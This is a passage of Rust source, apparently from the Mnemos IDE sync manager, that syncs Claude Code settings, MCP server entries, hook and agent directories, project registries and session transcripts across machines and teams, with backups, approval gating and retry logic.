            Some((path, _, false)) => modified_after(&path, server_written_ms(state)),
            None => false,
        }
    }

    /// The local file a single-file key syncs, whether it is raw text, and
    /// whether its value is platform-specific. `None` for `~/.claude.json`'s
    /// mcpServers (a slot, not a file) and for a file with no place here.
    fn single_file_target(&self, key: &str) -> Option<(PathBuf, bool, bool)> {
        if key == "settings" {
            Some((self.paths.settings_json()?, false, false))
        } else if key == SETTINGS_V2_KEY {
            Some((
                self.paths.mnemos_settings_toml()?.to_path_buf(),
                true,
                false,
            ))
        } else {
            let cfg = GLOBAL_FILES.iter().find(|f| f.sync_key == key)?;
            Some((
                self.paths.claude_dir.join(cfg.file_name),
                cfg.raw,
                cfg.platform_specific,
            ))
        }
    }

    /// [`file_key_value_hash`] of what this machine has on disk for a
    /// single-file key, `None` when there is nothing (no file, or no
    /// `mcpServers` in `~/.claude.json`).
    async fn local_file_hash(&self, key: &str) -> Option<String> {
        if key == SETTINGS_V2_KEY {
            let path = self.paths.mnemos_settings_toml()?;
            let bytes = tokio::fs::read(path).await.ok()?;
            let local = settings_toml::extract(
                &String::from_utf8_lossy(&bytes),
                self.settings_policy.as_ref()?,
            )?;
            return Some(sha256_hex(local.canonical().as_bytes()));
        }
        if key == CLAUDE_JSON_MCP_SYNC_KEY {
            let bytes = tokio::fs::read(&self.paths.claude_json).await.ok()?;
            let parsed: Value = serde_json::from_slice(&bytes).ok()?;
            return parsed.get("mcpServers").map(mcp_servers_hash);
        }
        let (path, raw, platform_specific) = self.single_file_target(key)?;
        let bytes = tokio::fs::read(&path).await.ok()?;
        if raw {
            return Some(sha256_hex(String::from_utf8_lossy(&bytes).as_bytes()));
        }
        Some(match serde_json::from_slice::<Value>(&bytes) {
            Ok(value) if platform_specific => {
                sha256_hex(strip_nested_platform_keys(value).to_string().as_bytes())
            }
            Ok(value) => sha256_hex(value.to_string().as_bytes()),
            // Unreadable: never taken for any value the server could hold.
            Err(_) => sha256_hex(&bytes),
        })
    }

    /// [`file_key_value_hash`], plus the per-key settings, whose hash is of
    /// what the server value sets on this machine under this build's policy.
    fn value_hash(&self, key: &str, value: &Value) -> Option<String> {
        if key == SETTINGS_V2_KEY {
            let view = settings_toml::server_view(
                value,
                current_platform(),
                self.settings_policy.as_ref()?,
            );
            return Some(sha256_hex(view.canonical().as_bytes()));
        }
        file_key_value_hash(key, value)
    }

    /// This machine's [`Baseline`], read from the Mnemos store on first use.
    /// One written under another admin profile counts as no baseline.
    async fn baseline<'a>(&self, st: &'a mut PushState) -> &'a mut Baseline {
        if st.baseline.is_none() {
            let pid = self.profile_id.lock().await.clone();
            let loaded = match self.paths.sync_baseline_json() {
                Some(path) => tokio::fs::read(&path)
                    .await
                    .ok()
                    .and_then(|bytes| serde_json::from_slice::<Baseline>(&bytes).ok())
                    .filter(|b| b.profile_id == pid),
                None => None,
            };
            st.baseline = Some(loaded.unwrap_or(Baseline {
                profile_id: pid,
                keys: BTreeMap::new(),
            }));
        }
        st.baseline.get_or_insert_with(Baseline::default)
    }

    /// Record `value` (the key's whole server value, as pulled or just
    /// pushed) as the last sync of `key` at `version`. Only directory keys
    /// keep a baseline (their per-file hashes of this machine's slot). The
    /// file is rewritten only when the entry changed.
    async fn note_baseline(&self, st: &mut PushState, key: &str, value: &Value, version: i64) {
        let entry = if let Some(cfg) = DIRECTORIES.iter().find(|d| d.sync_key == key) {
            BaselineEntry {
                version,
                files: dir_slot(cfg, value).map(dir_hashes).unwrap_or_default(),
                sha256: None,
            }
        } else if let Some(hash) = self.value_hash(key, value) {
            BaselineEntry {
                version,
                files: BTreeMap::new(),
                sha256: Some(hash),
            }
        } else {
            return;
        };
        let baseline = self.baseline(st).await;
        if baseline.keys.get(key) == Some(&entry) {
            return;
        }
        baseline.keys.insert(key.to_string(), entry);
        let bytes = match serde_json::to_vec_pretty(&*baseline) {
            Ok(bytes) => bytes,
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", "sync baseline not serialized: {e}");
                return;
            }
        };
        if let Some(path) = self.paths.sync_baseline_json() {
            if let Err(e) = atomic_write(&path, &bytes).await {
                tracing::warn!(target: "mnemos_ide_sync::manager", "sync baseline not saved: {e:#}");
            }
        }
    }

    /// A team member's pull of the team's shared keys into the local
    /// `~/.claude` directories. Only members apply: the owner is the team
    /// blob's single writer and already has every file in it.
    ///
    /// Each directory key is merged with the member's local files, the
    /// team's copy winning a file both sides have (an owner's update to an
    /// existing file reaches the member), a file only the member has kept,
    /// and the team's tombstones honored. Nothing is written, and nothing
    /// muted, when that changes nothing on disk; anything replaced goes to
    /// the backups. The member's own baseline is never touched: the team
    /// apply is not a sync of the member's personal key.
    ///
    /// `claude-md` (a raw whole-file blob) is deliberately NOT written to
    /// disk: a shared CLAUDE.md must not clobber the member's personal
    /// global file; it stays visible in the Drive tree via the status
    /// snapshot instead. Keys in `pending` (local changes not pushed yet)
    /// are left alone.
    async fn do_pull_team(
        self: &Arc<Self>,
        push_state: &Arc<AsyncMutex<PushState>>,
        pending: Option<&HashSet<String>>,
    ) {
        if self
            .team_is_owner
            .load(std::sync::atomic::Ordering::Relaxed)
        {
            return;
        }
        let Some(team) = self.team_id.lock().await.clone() else {
            return;
        };
        let states = match self.client.pull_team_all(&team).await {
            Ok(s) => s,
            Err(e) => {
                tracing::warn!(target: "mnemos_ide_sync::manager", team, "team pull failed: {e:#}");
                return;
            }
        };
        for s in states {
            if !SHAREABLE_TEAM_KEYS.contains(&s.key.as_str()) || s.key == "claude-md" {
                continue;
            }
            if pending.is_some_and(|p| p.contains(&s.key)) || self.key_skipped(&s.key) {
                continue;
            }
            let Some(cfg) = DIRECTORIES.iter().find(|c| c.sync_key == s.key) else {
                continue;
            };
            // The team's hooks are someone else's code: each change waits
            // for this machine's approval like the account's own.
            self.refresh_gate_pending(&s.key, &s.value, GateSource::Team)
                .await;
            let local_dir = self.paths.claude_dir.join(cfg.relative);
            let local = serialize_directory(&local_dir, cfg).unwrap_or_else(|| json!({}));
            // The team's copy is the "local" side of this merge: it wins.
            let merged = without_unsynced_rels(cfg, merge_for_key(&s.key, &s.value, &local));
            let mut files = merged.clone();
            if let Some(obj) = files.as_object_mut() {
                obj.remove(DIR_TOMBSTONES_KEY);
            }
            if files == local {
                continue;
            }
            if let Err(e) = self
                .apply_state_as(&s.key, &merged, push_state, ApplyMode::NoDelete)
                .await
            {
                tracing::warn!(
                    target: "mnemos_ide_sync::manager",
                    key = %s.key,
                    team,
                    "team apply failed: {e:#}",
                );
            }
        }
    }

    /// Write a pulled key to disk as the server has it (a directory key
    /// mirrors: see [`ApplyMode::Mirror`]).
    #[cfg(test)]
    async fn apply_state(
        self: &Arc<Self>,
        key: &str,
        value: &Value,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        self.apply_state_as(key, value, push_state, ApplyMode::Mirror)
            .await
    }

    /// Write a pulled key to disk. Every file it replaces or removes goes to
    /// the backups first ([`Backups`]), a file that already holds the bytes
    /// is not written, and `mode` says whether a directory key's local files
    /// missing from `value` are set aside.
    async fn apply_state_as(
        self: &Arc<Self>,
        key: &str,
        value: &Value,
        push_state: &Arc<AsyncMutex<PushState>>,
        mode: ApplyMode,
    ) -> Result<(), IdeError> {
        let backups = Backups::new(&self.paths);
        // Skip heavy/legacy keys, and the session index: state for the
        // transcript worker (see `poll_session_index`), not a file.
        if key == SESSION_INDEX_KEY
            || key == LEGACY_CLAUDE_JSON_MCP_SYNC_KEY
            || key.starts_with("twincurrent-build:")
            || key.starts_with(crate::live_agents::KEY_PREFIX)
            || key.starts_with("claude-sessions:")
            || key.starts_with("project-claude:")
            || key.starts_with("project-env:")
            || key.starts_with("raw-env:")
            || key == "claude-config"
        {
            return Ok(());
        }
        // Hooks without the opt-in are never written here; every other
        // gated key is written with its unapproved changes held back.
        if self.key_skipped(key) {
            return Ok(());
        }
        let gated;
        let value = if gates::gate_kind(key).is_some() {
            gated = self.gate_incoming(key, value).await;
            &gated
        } else {
            value
        };
        // A statusline.py held back with nothing here to keep: no file.
        if key == gates::STATUSLINE_KEY && value.is_null() {
            return Ok(());
        }

        // Sync protocol 1: a key registered as wrapped (crate::protocol::
        // uses_envelope) is read in either form. Its data is applied when the
        // schema is known; a newer schema or a deleted key is left alone
        // rather than written to disk as JSON. Every other key is a legacy
        // key and its value is applied as it is, even when it happens to
        // look like an envelope (a settings file with `schema` and `data`).
        let unwrapped;
        let value = if crate::protocol::uses_envelope(key) {
            match crate::protocol::decode_value(value, crate::protocol::MAX_KNOWN_SCHEMA) {
                crate::protocol::Decoded::Known(env) if env.deleted_at.is_none() => {
                    unwrapped = env.data;
                    &unwrapped
                }
                crate::protocol::Decoded::Known(_) => return Ok(()),
                crate::protocol::Decoded::UnknownSchema(schema) => {
                    tracing::warn!(
                        target: "mnemos_ide_sync::manager",
                        key,
                        schema,
                        "pulled value uses a newer format; not applied (update Mnemos)",
                    );
                    return Ok(());
                }
                crate::protocol::Decoded::Legacy(_) => value,
            }
        } else {
            value
        };

        // ~/.claude.json mcpServers (platform envelope)
        if key == CLAUDE_JSON_MCP_SYNC_KEY {
            let Some(env) = value.as_object() else {
                return Ok(());
            };
            let platform = current_platform();
            let Some(my_mcp) = env.get(platform) else {
                return Ok(());
            };
            return self
                .apply_claude_json_mcp(my_mcp, push_state, &backups)
                .await;
        }

        // Global files (.env, settings.json, etc.)
        if let Some(cfg) = GLOBAL_FILES.iter().find(|c| c.sync_key == key) {
            // Off on this machine (the default for `.env`): the server's
            // copy is not written here.
            if cfg.opt_in && !self.claude_env_enabled() {
                tracing::debug!(target: "mnemos_ide_sync::manager", key, "sync of this file is off here; not applied");
                return Ok(());
            }
            let target = self.paths.claude_dir.join(cfg.file_name);
            let final_value = if cfg.platform_specific {
                let Some(env) = value.as_object() else {
                    return Ok(());
                };
                let Some(my) = env.get(current_platform()) else {
                    return Ok(());
                };
                // Heal a slot that already carries a leaked nested envelope
                // key, so a poisoned server value never lands on disk.
                if cfg.raw {
                    my.clone()
                } else {
                    strip_nested_platform_keys(my.clone())
                }
            } else {
                value.clone()
            };
            let bytes = if cfg.raw {
                // Anything but text would land as an empty file.
                let Some(text) = final_value.as_str() else {
                    return Err(IdeError::Other(format!(
                        "pulled {key} is not text; not applied"
                    )));
                };
                text.as_bytes().to_vec()
            } else {
                serde_json::to_vec_pretty(&final_value)?
            };
            push_state.lock().await.suppress(target.clone());
            replace_file(&target, &bytes, &backups).await?;
            return Ok(());
        }

        // Directories (mcp-servers/, agents/, …)
        if let Some(cfg) = DIRECTORIES.iter().find(|c| c.sync_key == key) {
            let target = self.paths.claude_dir.join(cfg.relative);
            let Some(map) = dir_slot(cfg, value) else {
                return Ok(());
            };
            push_state.lock().await.suppress(target.clone());
            deserialize_directory(&target, map, cfg, mode, &backups).await?;
            return Ok(());
        }

        // claude-memory:{profile}:{repo}
        if let Some(rest) = key.strip_prefix("claude-memory:") {
            let Some((profile, repo)) = rest.split_once(':') else {
                return Ok(());
            };
            let pid = self.profile_id.lock().await.clone();
            if pid.as_deref() != Some(profile) {
                return Ok(());
            }
            let Some(project_dir) = self.find_memory_project_dir(repo).await else {
                return Ok(());
            };
            tokio::fs::create_dir_all(&project_dir).await.ok();
            // Only what the payload writes. The project dir itself also
            // holds the session transcripts, and muting it would drop a
            // session's last appends for the suppression window.
            {
                let mut st = push_state.lock().await;
                st.suppress(project_dir.join("memory"));
                st.suppress(project_dir.join("MEMORY.md"));
            }
            apply_memory_payload(&project_dir, value, &backups).await?;
            push_state
                .lock()
                .await
                .memory_names
                .insert(key.to_string(), memory_names_in(value));
            return Ok(());
        }

        // Mnemos data files
        if key == registry::PROJECTS_KEY {
            return self.apply_projects(value, push_state).await;
        }
        if key == "settings" {
            if let Some(p) = self.paths.settings_json() {
                let bytes = serde_json::to_vec_pretty(value)?;
                push_state.lock().await.suppress(p.clone());
                replace_file(&p, &bytes, &backups).await?;
            }
            return Ok(());
        }
        // Another machine's tab list. Applying it replaced this machine's
        // tabs with that machine's; the shared open set lives in
        // `projects.json` now.
        if key == MNEMOS_WORKSPACE_STATE_KEY {
            tracing::debug!(target: "mnemos_ide_sync::manager", key, "local-only key — ignoring pulled value");
            return Ok(());
        }

        // The whole-file settings.toml of older builds: never written.
        if key == MNEMOS_USER_SETTINGS_KEY {
            return Ok(());
        }
        // Mnemos settings.toml, per key: only the synced settings are
        // written into the file, everything else in it stays.
        if key == SETTINGS_V2_KEY {
            let (Some(p), Some(policy)) = (
                self.paths.mnemos_settings_toml().map(Path::to_path_buf),
                self.settings_policy.as_ref(),
            ) else {
                return Ok(());
            };
            let text = match tokio::fs::read(&p).await {
                Ok(bytes) => String::from_utf8_lossy(&bytes).into_owned(),
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
                Err(e) => return Err(IdeError::Other(format!("read {p:?}: {e}"))),
            };
            let updated = settings_toml::apply(&text, value, current_platform(), policy)
                .map_err(IdeError::Other)?;
            if let Some(updated) = updated {
                push_state.lock().await.suppress(p.clone());
                replace_file(&p, updated.as_bytes(), &backups).await?;
            }
            return Ok(());
        }

        tracing::debug!(target: "mnemos_ide_sync::manager", key, "unknown sync key — ignoring");
        Ok(())
    }

    /// Write this platform's pulled `mcpServers` into `~/.claude.json`.
    ///
    /// That file is Claude Code's own config (hundreds of KB, rewritten
    /// about every minute), so only a readable JSON object is ever touched,
    /// only its `mcpServers` changes, and nothing is written when it already
    /// holds exactly `mcp`. A missing file is left missing: Claude Code
    /// creates it, and restores it from its own backups, which a stub
    /// written here would prevent. Every refusal is an `Err`, so the key's
    /// version stays unknown and the next pull tries again.
    async fn apply_claude_json_mcp(
        &self,
        mcp: &Value,
        push_state: &Arc<AsyncMutex<PushState>>,
        backups: &Backups,
    ) -> Result<(), IdeError> {
        if !mcp.is_object() {
            return Err(IdeError::Other(
                "the pulled mcpServers slot is not a JSON object; not applied".to_string(),
            ));
        }
        let path = self.paths.claude_json.clone();
        // Taken before the read, so any write after it shows up below.
        let stamp = file_stamp(&path).await;
        let bytes = match tokio::fs::read(&path).await {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                return Err(IdeError::Other(
                    "~/.claude.json does not exist yet; mcpServers not applied".to_string(),
                ));
            }
            Err(e) => return Err(IdeError::Other(format!("read ~/.claude.json: {e}"))),
        };
        let mut existing = match serde_json::from_slice::<Value>(&bytes) {
            Ok(Value::Object(map)) => map,
            Ok(_) => {
                return Err(IdeError::Other(
                    "~/.claude.json is not a JSON object; not applying mcpServers".to_string(),
                ));
            }
            Err(e) => {
                return Err(IdeError::Other(format!(
                    "~/.claude.json is not valid JSON ({e}); not applying mcpServers"
                )));
            }
        };
        // The pulled slot has no `env` or `headers`: each server keeps the
        // ones this machine has.
        let mcp = &with_local_mcp_secrets(mcp, existing.get("mcpServers"));
        if existing.get("mcpServers") == Some(mcp) {
            push_state.lock().await.last_local_mcp_hash = Some(mcp_servers_hash(mcp));
            return Ok(());
        }
        existing.insert("mcpServers".to_string(), mcp.clone());
        let pretty = serde_json::to_vec_pretty(&Value::Object(existing))?;
        push_state.lock().await.suppress(path.clone());
        backups.copy(&path, &bytes).await?;
        // Claude Code wrote the file since it was read: writing now would
        // drop that write.
        if file_stamp(&path).await != stamp {
            return Err(IdeError::Other(
                "~/.claude.json changed while mcpServers was being applied; will retry".to_string(),
            ));
        }
        atomic_write(&path, &pretty).await?;
        push_state.lock().await.last_local_mcp_hash = Some(mcp_servers_hash(mcp));
        Ok(())
    }

    /// Fold a pulled registry into `projects.json`: `registry::merge` of the
    /// file and `remote`, inside `ProjectStore`'s locked update so an app
    /// edit in flight is merged, not overwritten. Never drops a local record
    /// the server lacks (the old pull replaced the file wholesale, which is
    /// how the Mac lost projects the PC never had).
    ///
    /// Projects whose sync is disabled on this machine are invisible to the
    /// merge: the server's copies (and tombstones) of them are dropped before
    /// merging, so the local record is left exactly as it is.
    ///
    /// Afterwards: when the result holds something the server lacks, a push is
    /// requested; when it matches the server, it is remembered as synced so
    /// the watcher event from this very write is not pushed back.
    async fn apply_projects(
        &self,
        remote: &Value,
        push_state: &Arc<AsyncMutex<PushState>>,
    ) -> Result<(), IdeError> {
        if !remote.is_object() {
            tracing::debug!(target: "mnemos_ide_sync::manager", "pulled projects value is not an object — ignoring");
            return Ok(());
        }
        if self.paths.projects_json().is_none() {
            return Ok(());
        }
        let remote = remote.clone();
        let platform = current_platform();
        let applied = self
            .update_store(
                move |s| -> Result<ProjectsApplied, mnemos_ide_core::IdeError> {
                    let disabled: HashSet<String> = s.sync_disabled_ids().iter().cloned().collect();
                    let remote_view = filter_projects_for_push(remote, &disabled);
                    let before = s.registry_value();
                    // The server's value as this build stores it. Records pass
                    // through `Project` on their way to disk, which can respell a
                    // field (a `+02:00` timestamp as `Z`, a missing `lastOpenedAt`
                    // as null). Against the raw server value that respelling looks
                    // like news, and when the server's copy wins the merge the push
                    // finds nothing to send: pull asks for a push, push applies the
                    // server copy again, forever.
                    let mut as_stored = s.clone();
                    as_stored.replace_registry(&remote_view)?;
                    let remote_stored = registry::normalize(&as_stored.registry_value());

                    // A disabled record is never folded with a server record: the
                    // fold's `replacedBy` would reach the server (the push filter
                    // keeps tombstones keyed by the other id) and make every other
                    // machine drop its own record for an id it cannot see.
                    let merged =
                        registry::merge_keeping_apart(&before, &remote_view, platform, &disabled);
                    s.replace_registry(&merged)?;
                    // Exactly what the update is about to save (it normalizes the
                    // registry the same way before writing).
                    let on_disk = registry::normalize_keeping_apart(&s.registry_value(), &disabled);
                    let in_sync = registry::projects_semantically_equal(
                        &filter_projects_for_push(on_disk.clone(), &disabled),
                        &remote_stored,
                    );
                    let changed = !registry::projects_semantically_equal(&on_disk, &before);
                    Ok(ProjectsApplied {
                        on_disk,
                        in_sync,
                        changed,
                    })
                },
            )
            .await??;

        {
            let mut st = push_state.lock().await;
            if applied.in_sync {
                st.projects_synced = Some(applied.on_disk);
            } else {
                st.projects_synced = None;
                st.push_requests.insert(DebounceScope::Projects);
            }
        }
        if applied.changed {
            tracing::info!(
                target: "mnemos_ide_sync::manager",
                push_back = !applied.in_sync,
                "applied project registry from the server",
            );
            self.status_tx
                .send_modify(|s| s.projects_applied_at = Some(SystemTime::now()));
        }
        Ok(())
    }
}

/// Outcome of folding a pulled registry into `projects.json`.
struct ProjectsApplied {
    /// The registry as written to disk.
    on_disk: Value,
    /// Whether the server already holds everything in `on_disk`.
    in_sync: bool,
    /// Whether the pull changed the registry's content on disk.
    changed: bool,
}

// ─────────────────────────────────────────────────────────────────────────────
// Per-project sync opt-out — push filter.
// ─────────────────────────────────────────────────────────────────────────────

/// Pluck `syncDisabledProjectIds` from a parsed `workspace_state.json` value.
/// Returns an empty set if the field is missing, the wrong type, or empty.
fn collect_sync_disabled_from_value(value: &Value) -> HashSet<String> {
    value
        .get("syncDisabledProjectIds")
        .and_then(Value::as_array)
        .map(|arr| {
            arr.iter()
                .filter_map(Value::as_str)
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default()
}

/// A `projects.json` value without the projects whose sync is disabled on
/// this machine: their records and their `deletedProjects` tombstones.
///
/// Used on push (the server never hears about them) and on pull, applied to
/// the server's value, so the server's copy of such a project can neither
/// overwrite nor delete the local one.
fn filter_projects_for_push(mut value: Value, disabled: &HashSet<String>) -> Value {
    if disabled.is_empty() {
        return value;
    }
    if let Some(arr) = value
        .get_mut(registry::PROJECTS_KEY)
        .and_then(Value::as_array_mut)
    {
        arr.retain(|p| {
            let Some(id) = p.get("id").and_then(Value::as_str) else {
                return true;
            };
            !disabled.contains(id)
        });
    }
    if let Some(tombs) = value
        .get_mut(registry::DELETED_KEY)
        .and_then(Value::as_object_mut)
    {
        tombs.retain(|id, _| !disabled.contains(id));
    }
    value
}

// ─────────────────────────────────────────────────────────────────────────────
// Free functions: checkouts, hashing, atomic write, dir (de)serialize.
// ─────────────────────────────────────────────────────────────────────────────

/// Whether `merged` holds a record id or a tombstone id that `server` lacks.
fn registry_ids_missing_from(merged: &Value, server: &Value) -> bool {
    fn record_ids(v: &Value) -> HashSet<&str> {
        v.get(registry::PROJECTS_KEY)
            .and_then(Value::as_array)
            .map(|a| {
                a.iter()
                    .filter_map(|p| p.get("id").and_then(Value::as_str))
                    .collect()
            })
            .unwrap_or_default()
    }
    fn tombstone_ids(v: &Value) -> HashSet<&str> {
        v.get(registry::DELETED_KEY)
            .and_then(Value::as_object)
            .map(|t| t.keys().map(String::as_str).collect())
            .unwrap_or_default()
    }
    !record_ids(merged).is_subset(&record_ids(server))
        || !tombstone_ids(merged).is_subset(&tombstone_ids(server))
}

/// A record's non-empty `gitRepo`.
fn git_repo_of(project: &Value) -> Option<&str> {
    project
        .get("gitRepo")
        .and_then(Value::as_str)
        .filter(|s| !s.trim().is_empty())
}

/// `~/.claude/projects/<slug>` for a checkout at `root` on this machine,
/// `<slug>` being Claude Code's own name for it. `None` (with a warning)
/// when the path is too long for Claude Code to use.
fn memory_dir_for_root(claude_projects_dir: &Path, root: &Path) -> Option<PathBuf> {
    match claude_project_dir_name(root) {
        Some(slug) => Some(claude_projects_dir.join(slug)),
        None => {
            tracing::warn!(
                target: "mnemos_ide_sync::manager",
                root = %root.display(),
                "checkout path too long for a Claude project dir; memory not synced",
            );
            None
        }
    }
}

/// Whether two `~/.claude/projects` dir names name the same directory:
/// Claude Code keeps the cwd's case in the slug, and on Windows and macOS a
/// cwd typed as `c:\code\x` and one read as `C:\code\x` are the same folder.
fn same_dir_name(a: &str, b: &str, platform: &str) -> bool {
    if platform == "linux" {
        a == b
    } else {
        a.eq_ignore_ascii_case(b)
    }
}

/// The checkout enclosing `cwd` on this machine and its `origin` as
/// `owner/repo`. Reads `.git/config` directly rather than running git.
/// `None` when `cwd` does not exist here, is the home dir, or is not inside
/// a checkout with an `origin`.
fn repo_root_and_remote(cwd: &Path) -> Option<(PathBuf, String)> {
    let root = tab_root(&RealFs, cwd)?;
    let url = read_origin_url(&root)?;
    Some((root, registry::normalize_git_remote(&url)?))
}

/// The record whose checkout speaks for `git_repo`'s memory on this machine,
/// with that checkout. Two records can share a repo (TwinCurrent-Build and
/// TCB are both `bob/TCB`) and so one memory key; of those whose
/// checkout `resolve` finds, the pick is by exact `gitRepo` spelling, then
/// a checkout folder named like the repo, then the oldest registration,
/// then the id. Registry order plays no part.
fn pick_memory_record(
    store: &mut ProjectStore,
    git_repo: &str,
    mut resolve: impl FnMut(&mut ProjectStore, &str) -> Option<PathBuf>,
) -> Option<(String, PathBuf)> {
    let key = registry::git_repo_key(git_repo);
    let repo_name = git_repo
        .trim_end_matches('/')
        .rsplit(['/', ':'])
        .next()
        .unwrap_or(git_repo)
        .trim_end_matches(".git")
        .to_string();
    let candidates: Vec<(String, String, chrono::DateTime<chrono::Utc>)> = store
        .projects
        .iter()
        .filter_map(|p| {
            let repo = p.git_repo()?;
            (registry::git_repo_key(&repo) == key).then(|| (p.id.clone(), repo, p.created_at))
        })
        .collect();
    let mut resolved = Vec::new();
    for (id, repo, created_at) in candidates {
        let Some(root) = resolve(store, &id) else {
            continue;
        };
        let named_like_repo = root
            .file_name()
            .is_some_and(|n| n.to_string_lossy().eq_ignore_ascii_case(&repo_name));
        resolved.push((
            (repo != git_repo, !named_like_repo, created_at, id.clone()),
            id,
            root,
        ));
    }
    resolved.sort_by(|a, b| a.0.cmp(&b.0));
    resolved.into_iter().next().map(|(_, id, root)| (id, root))
}

/// Record `root` as `git_repo`'s checkout on `platform`, on ONE record whose
/// slot for that platform is still empty (no `paths.<platform>` and no legacy
/// `path` of that platform's shape). Prefers the record named like the
/// checkout folder, then the oldest registration. Returns the id it filled.
///
/// Never overwrites a filled slot, and does nothing when another record
/// already claims `root` here: a transcript's cwd is weak evidence next to a
/// path a user picked or discovery verified.
fn learn_platform_path_in(
    store: &mut ProjectStore,
    git_repo: &str,
    root: &Path,
    platform: &str,
) -> Option<String> {
    let root_s = root.to_string_lossy().into_owned();
    let claimed = store.projects.iter().any(|p| {
        p.platform_path(platform)
            .is_some_and(|lp| registry::same_path(&lp.to_string_lossy(), &root_s, platform))
    });
    if claimed {
        return None;
    }
    let key = registry::git_repo_key(git_repo);
    let dir_name = registry::path_file_name(&root_s, platform);
    let idx = store
        .projects
        .iter()
        .enumerate()
        .filter(|(_, p)| {
            p.platform_path(platform).is_none()
                && p.git_repo()
                    .is_some_and(|g| registry::git_repo_key(&g) == key)
        })
        .min_by_key(|(_, p)| {
            let named_like_dir = dir_name
                .as_deref()
                .is_some_and(|n| p.name.eq_ignore_ascii_case(n));
            (!named_like_dir, p.created_at, p.id.clone())
        })
        .map(|(i, _)| i)?;
    let project = &mut store.projects[idx];
    project.set_platform_path(platform, root);
    Some(project.id.clone())
}

/// Sessions whose transcript a pull created on this machine
/// ([`crate::transcripts::pulled_session_ids`]). Their `cwd` is another
/// machine's, mapped here as a string: `~/Desktop/foo`, a network volume,
/// a path this machine may never have opened. Resolving a checkout from it
/// would stat that path (a macOS privacy prompt for Desktop or Documents,
/// a stall on an unreachable mount), so the transcript scans skip them.
fn pulled_sessions(store_dir: Option<&Path>) -> HashSet<String> {
    store_dir
        .map(crate::transcripts::pulled_session_ids)
        .unwrap_or_default()
}

/// Claude Code stamps every transcript line with the session `cwd`. Read
/// the newest `*.jsonl` in a project dir, other than the sessions in
/// `skip`, and return the first `cwd` found. Only the first few lines are
/// scanned: summaries at the top carry no `cwd`, real turns do.
fn cwd_from_transcripts(project_dir: &Path, skip: &HashSet<String>) -> Option<PathBuf> {
    use std::io::{BufRead, BufReader};
    let mut candidates: Vec<(SystemTime, PathBuf)> = std::fs::read_dir(project_dir)
        .ok()?
        .flatten()
        .filter_map(|e| {
            let path = e.path();
            if path.extension().and_then(|s| s.to_str()) != Some("jsonl") {
                return None;
            }
            if path
                .file_stem()
                .and_then(|s| s.to_str())
                .is_some_and(|sid| skip.contains(sid))
            {
                return None;
            }
            let mtime = e.metadata().ok()?.modified().ok()?;
            Some((mtime, path))
        })
        .collect();
    candidates.sort_by(|a, b| b.0.cmp(&a.0));
    for (_, path) in candidates {
        let Ok(file) = std::fs::File::open(&path) else {
            continue;
        };
        for line in BufReader::new(file).lines().take(50).map_while(Result::ok) {
            let Ok(v) = serde_json::from_str::<Value>(&line) else {
                continue;
            };
            if let Some(cwd) = v.get("cwd").and_then(Value::as_str) {
                if !cwd.is_empty() {
                    return Some(PathBuf::from(cwd));
                }
            }
        }
    }
    None
}

/// Run transcript jobs one at a time until the event loop drops its sender.
/// Jobs that queued up while one ran are coalesced: their paths are pushed
/// in one batch, a sweep or full pull runs once, and of several session
/// indexes only the newest is pulled.
///
/// Every batch ends by adding what it uploaded to the shared session index
/// (`SyncManager::push_session_index`). An update that fails stays owed: it
/// goes with the next batch, or on its own after a transient failure (the
/// usual retry backoff), so a machine that falls quiet still announces its
/// last uploads. An upload that fails for a transient reason is retried the
/// same way, so the last turn before a network blip reaches the other
/// machine within minutes, not at the hourly listing.
fn spawn_transcript_worker(
    manager: Arc<SyncManager>,
    push_state: Arc<AsyncMutex<PushState>>,
    sync: Arc<TranscriptSync>,
    jobs: mpsc::UnboundedReceiver<TranscriptJob>,
) -> JoinHandle<()> {
    sync_runtime().spawn(run_transcript_worker(
        manager,
        push_state,
        sync,
        jobs,
        &TRANSIENT_RETRY_BACKOFF_MS,
    ))
}

/// [`spawn_transcript_worker`]'s loop, with its retry schedule passed in
/// (tests use a short one).
async fn run_transcript_worker(
    manager: Arc<SyncManager>,
    push_state: Arc<AsyncMutex<PushState>>,
    sync: Arc<TranscriptSync>,
    mut jobs: mpsc::UnboundedReceiver<TranscriptJob>,
    backoff_ms: &'static [u64],
) {
    // Index updates that failed in a row for a reason worth a timer.
    let mut index_failures: usize = 0;
    // What uploads that failed for a transient reason left behind: the
    // transcripts to push again, and whether a sweep has to run again.
    // `push_failures` counts the batches in a row that left something.
    let mut owed_paths: BTreeSet<PathBuf> = BTreeSet::new();
    let mut sweep_owed = false;
    let mut push_failures: usize = 0;
    loop {
        // While anything is owed, waiting for a job times out into a batch
        // that retries just that.
        let failures = index_failures.max(push_failures);
        let first = if failures == 0 {
            match jobs.recv().await {
                Some(job) => Some(job),
                None => break,
            }
        } else {
            let step = (failures - 1).min(backoff_ms.len() - 1);
            let wait = Duration::from_millis(backoff_ms[step]);
            match tokio::time::timeout(wait, jobs.recv()).await {
                Ok(Some(job)) => Some(job),
                Ok(None) => break,
                Err(_) => None,
            }
        };
        let mut paths: BTreeSet<PathBuf> = std::mem::take(&mut owed_paths);
        let resweep = std::mem::take(&mut sweep_owed);
        let mut sweep = false;
        let mut pull = false;
        let mut index: Option<Value> = None;
        let mut queued: Vec<TranscriptJob> = first.into_iter().collect();
        while let Ok(job) = jobs.try_recv() {
            queued.push(job);
        }
        for job in queued {
            match job {
                TranscriptJob::Push(p) => paths.extend(p),
                TranscriptJob::Sweep => sweep = true,
                TranscriptJob::Pull => pull = true,
                TranscriptJob::PullIndexed(v) => index = Some(v),
            }
        }
        // Once per outage at warn, not on every retry.
        let log_upload_failure = |what: &str, e: &IdeError| {
            if push_failures == 0 {
                tracing::warn!(target: "mnemos_ide_sync::manager", "transcript {what} failed: {e:#}");
            } else {
                tracing::debug!(
                    target: "mnemos_ide_sync::manager",
                    attempts = push_failures,
                    "transcript {what} failed: {e:#}",
                );
            }
        };
        // The first pull of the run comes before any upload: agent restore
        // is waiting for it, and a full sweep can take minutes. Pulling
        // first is safe: before merging into a local transcript, the pull
        // pushes that file's own unpushed lines (`push_file_seen`), so no
        // local turn is merged over.
        let pull_first = pull && !manager.status_tx.borrow().first_transcript_pull_done;
        let mut pulled_everything = false;
        if pull_first {
            pulled_everything = run_transcript_pull(&manager, &sync).await;
        }
